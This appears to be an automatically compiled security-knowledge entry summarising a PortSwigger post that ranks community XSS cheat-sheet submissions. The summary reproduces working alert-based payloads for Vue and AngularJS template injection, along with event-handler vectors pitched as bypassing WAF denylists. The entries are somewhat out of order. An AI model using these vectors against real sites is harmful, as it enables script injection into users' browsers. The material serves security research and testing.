---
type: learning-source-summary
compiled_at: 2026-08-11T05:03:52.060165+00:00
source_quality: 8
source_id: appsec-fyi-root-topic-index
source_role: discovery_index
source_trust: discovery_only
promotion_policy: original_source_required
promotion_status: proposal_only
knowledge_types: [vulnerability_pattern, evidence_requirement]
classification: Web2 skill update
vulnerability_class: Client-Side / XSS
---

# Our favourite community contributions to the XSS cheat sheet | PortSwigger Research

- URL: `https://portswigger.net/research/our-favourite-community-contributions-to-the-xss-cheat-sheet`
- Source ID / role / trust: `appsec-fyi-root-topic-index` / `discovery_index` / `discovery_only`
- Acquisition provenance: cadence=`weekly`, method=`deep_link_discovery`, discovered-from=`direct root`
- Registry schema/digest: `2` / `cdfb32ac139b7826aa99b479fbf3ba207af5f2365d97942eaaf62f49e8bb643d`
- Source group: `appsec_fyi_linked_resources`
- Content chars: `4683`
- Classification: **Web2 skill update**
- Vulnerability class: **Client-Side / XSS**

## Source summary

- Number 7: Missing events At number seven is a whole range of missing events, submitted by @hahwul : <div onpointerover="alert(45)">hahwul(45)</div> <div onpointerdown="alert(45)">hahwul(45)</div> <div onpointerenter="alert(45)">hahwul(45)</div> <div onpointerleave="alert(45)">hahwul(45)</div> <div onpointermove="alert(45)">hahwul(45)</div> <div onpointerout="alert(45)">hahwul(45)</div> <div onpointerup="alert(45)">hahwul(45)</div> View this entry on the XSS cheat sheet Number 6: Shorter Vue injection In the sixth position is a Vue based vector entry, from @p4fg - this one uses the v-if attribute to save a few bytes: <x v-if=_c.constructor('alert(1)')()> View this entry on the XSS cheat sheet Number 5: Tiny AngularJS vector In at number five, this entry is a nice short vector from @NotSoSecure that may help when you have a character restriction limit with an AngularJS injection: <input ng-cut=$event.path|orderBy:'(y=alert)(1)'> View this entry on the XSS cheat sheet Number 4: DOM based AngularJS vector The entry at number four entry is a vector from @kachakil - they add a missing vector from our AngularJS research, and fix it so that it works in other contexts: {y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)' View this entry on the XSS cheat sheet Number 3: Unexpected Vue template injection An unexpected entry at number three!
- Guaranteed to bypass a denylist - or "blacklist" - of known bad events, many WAFs block on* but for those who don't: <input onbeforeinput=alert(1)> View this entry on the XSS cheat sheet Number 1: Base64 encoded javascript redirection Claiming the top spot, and for good reason, we consider this the best entry that we wanted to highlight.
- We like this submission from @davwwwx because it injects into an HTML attribute that doesn't support Vue template expressions - it's very reminiscent of our AngularJS sandbox bypass . <p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//"> View this entry on the XSS cheat sheet Number 2: Brand new onbeforeinput event The penultimate entry is from @laytonctf , who spotted a new relatively unknown event onbeforeinput.

## Extracted methodology

- Affected surface: Web/API/application surface
- Preconditions to verify: identify actor/tenant/object boundary, required role/session state, and whether the vulnerable action is read, write, delete, trigger, or value transfer.
- Minimal test method: reproduce with an owned/synthetic object first, then compare allowed vs disallowed actor/object pairs; preserve request deltas and response evidence.
- Evidence requirements: exact request/response pair, actor/object ownership proof, unauthorized impact, and negative controls showing the boundary should have blocked the action.
- False-positive gates: index/config/tool output is not proof; synthetic IDs only map behavior; severity needs demonstrated business/security impact.

## Knowledge and promotion semantics

- Candidate knowledge types: `vulnerability_pattern, evidence_requirement`
- Promotion status: `proposal_only`; manual review required: `true`
- Original-source resolution required: `true`
- Independent corroboration: `required`
- Promotion must record the exact playbook/eval/index/changelog changes or an explicit rejection reason.

## Compiler decision

- Use this as a patch proposal input, not a mature playbook edit, unless paired with eval coverage and changelog review.
